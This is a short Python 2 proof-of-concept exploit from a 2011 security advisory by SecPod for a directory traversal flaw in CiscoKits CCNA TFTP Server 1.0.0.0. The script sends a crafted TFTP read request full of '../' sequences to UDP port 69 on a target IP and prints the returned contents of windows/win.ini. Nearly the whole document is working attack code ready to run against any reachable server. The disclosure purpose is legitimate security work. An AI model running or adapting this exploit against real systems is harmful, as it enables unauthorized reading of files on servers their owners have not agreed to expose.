#!/usr/bin/python
##############################################################################
# Title     : CiscoKits TFTP Server Directory Traversal Vulnerability
# Author    : Antu Sanadi from SecPod Technologies (www.secpod.com)
# Vendor    : http://www.certificationkits.com/cisco-ccna-tftp-server/
# Advisory  : http://secpod.org/blog/?p=301
#             http://secpod.org/SECPOD_CiscoKits_TFTP_Server_Dir_Trav_POC.py
#             http://secpod.org/advisories/SECPOD_CiscoKits_TFTP_Server_Dir_Trav.txt
# Version   : CiscoKits CCNA TFTP Server 1.0.0.0
# Date      : 21/07/2011
##############################################################################
import sys, socket

def sendPacket(HOST, PORT, data):
    '''
    Sends UDP Data to a Particular Host on a Specified Port
    with a Given Data and Return the Response
    '''
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_sock.sendto(data, (HOST, PORT))
    data = udp_sock.recv(1024)
    udp_sock.close()
    return data

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print "\tUsage: python exploit.py target_ip"
        print "\tExample : python exploit.py 127.0.0.1"
        print "\tExiting..."
        sys.exit(0)

    HOST = sys.argv[1]                               ## The Server IP
    PORT = 69                                        ## Default TFTP port

    data = "\x00\x01"                                ## TFTP Read Request
    data += "../" * 10 + "windows/win.ini" + "\x00"  ## Read win.ini file using directory traversal
    data += "netascii\x00"                           ## TFTP Type

    # netascii
    rec_data = sendPacket(HOST, PORT, data)
    print "Data Found on the target : %s " %(HOST)
    print rec_data.strip()
